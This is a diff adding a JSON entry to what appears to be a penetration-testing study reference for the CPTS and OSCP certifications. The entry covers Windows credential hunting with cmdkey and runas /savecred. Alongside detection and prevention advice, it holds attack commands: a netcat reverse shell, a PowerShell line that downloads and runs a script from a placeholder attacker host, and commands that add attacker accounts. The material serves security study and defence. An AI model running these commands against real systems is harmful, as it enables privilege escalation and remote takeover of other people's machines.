@@ -1,0 +1,87 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "cmdkey",
+    "runas"
+  ],
+  "tags": [
+    "cmdkey",
+    "runas",
+    "stored-credentials"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Credential Hunting",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "List stored credentials",
+      "command": "cmdkey /list"
+    },
+    {
+      "label": "Run a command as the stored user",
+      "command": "runas /savecred /user:inlanefreight\\bob \"c:\\tools\\nc.exe 10.10.14.3 443 -e cmd.exe\""
+    }
+  ],
+  "notes": "=== Cmdkey Saved Credentials — Impersonation Without Knowing Password ===\nWindows Credential Manager saved credentials can be used with runas /savecred for arbitrary command execution.\n\n=== DISCOVERY ===\n  cmdkey /list   → enumerate all saved credentials in Windows Credential Manager\n  Output shows: Target (TERMSRV/hostname), Type (Domain Password), User (DOMAIN\\user)\n\nInteresting patterns:\n  TERMSRV/* = saved RDP credentials (used for automatic RDP reconnect)\n  Domain:* = domain account credentials\n  MicrosoftOffice* = Microsoft account/Office credentials\n\n=== EXPLOITATION ===\nrunas /savecred executes a command using the saved credential for the specified user\nWITHOUT requiring knowledge of the plaintext password:\n\n  runas /savecred /user:DOMAIN\\admin \"C:\\Windows\\System32\\cmd.exe\"\n  → Opens cmd.exe running as admin (uses cached credential silently)\n\n  runas /savecred /user:DOMAIN\\admin \"powershell -c 'IEX(iwr http://ATTACKER/shell.ps1)'\"\n  → Execute reverse shell as the saved credential user\n\n  runas /savecred /user:DOMAIN\\admin \"net localgroup administrators attacker /add\"\n  → Add attacker to local admins using saved credential\n\n=== WHAT MAKES THIS POWERFUL ===\nNo need to know the password — Windows uses the stored credential transparently\nWorks even if password has been changed after the credential was saved (until the cache is invalidated)\nSaved TERMSRV credentials survive password rotations in many configurations\n\n=== CHAINING CONTEXT ===\ncmdkey saved DA credentials → runas /savecred → DA shell → LSASS dump → domain hashes\nSaved local admin credentials → runas /savecred → admin shell → escalate to SYSTEM via Potato\nSaved credentials for server → runas /savecred → access to high-value systems without PTH\n\n=== WHAT TO LOOK FOR ===\ncmdkey /list output showing domain admin accounts = immediate high-value find\nTERMSRV entries indicating saved RDP sessions to domain controllers or servers\nShared workstations / kiosk machines commonly have saved credentials for auto-reconnect",
+  "references": [
+    {
+      "title": "Microsoft - cmdkey",
+      "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sessiongopher",
+      "note": "How saved session creds are often discovered.",
+      "rel": "prereq"
+    },
+    {
+      "id": "reg-stored-creds",
+      "note": "Registry-based credential sources.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "cmdkey-runas-savecred",
+  "name": "Credential Hunting - Stored Credentials (cmdkey/runas)",
+  "command": "cmdkey /list",
+  "description": "cmdkey lists saved Windows credentials. Even without seeing the password, runas /savecred executes commands as that stored user - potentially a privileged account.",
+  "opsec": "loud",
+  "mitre": [
+    "T1555"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "cmdkey stores Windows credentials in the Windows Credential Manager. Stored credentials can be used with `runas /savecred` to execute commands as another user without knowing their current password. If an administrator previously saved their credentials via cmdkey, any local user who discovers them can run arbitrary commands as that administrator.",
+    "prerequisites": "An administrator or privileged user previously stored credentials via cmdkey. The stored credential target matches a usable runas context. Local shell access.",
+    "impact": "Command execution as the credential owner (often a local or domain administrator) without knowing their password. Enables privilege escalation or lateral movement.",
+    "detection": "cmdkey /list execution by standard users. runas /savecred execution logged in Security event log. Credential Manager access events. SIEM: alert on runas /savecred from non-admin user.",
+    "artifacts": "Process log: cmdkey.exe and runas.exe executed by non-admin | Security event: logon with saved credentials | Windows Credential Manager: stored entries visible",
+    "prevention": "Do not store administrative credentials in the Windows Credential Manager on workstations or servers. Audit stored credentials regularly. Use PAM solutions (CyberArk, LAPS) to manage privileged credentials instead. Educate administrators on the risk of saving credentials interactively.",
+    "misconfiguration": "Administrator saves credentials via `cmdkey /add` for convenience (e.g., to RDP to servers without re-entering password). Credential remains stored indefinitely on the workstation.",
+    "vulnerable_config": "# Administrator stored credentials:\ncmdkey /list\n# Target: Domain:interactive=inlanefreight\\Administrator\n# Credential: ...(stored)\n\n# Attacker uses saved cred:\nrunas /savecred /user:inlanefreight\\Administrator 'cmd /c net user hacker P@ss1234! /add /domain'",
+    "secure_config": "# Audit credential manager\ncmdkey /list\n\n# Remove stored admin credentials\ncmdkey /delete:Domain:interactive=inlanefreight\\Administrator\n\n# Use LAPS for local admin passwords\n# Use JIT/PAM for privileged access rather than stored creds\n# Group Policy: prevent credential manager storing domain credentials",
+    "sources": [
+      "HTB M26",
+      "MITRE T1552.001",
+      "MITRE T1078"
+    ]
+  }
+}
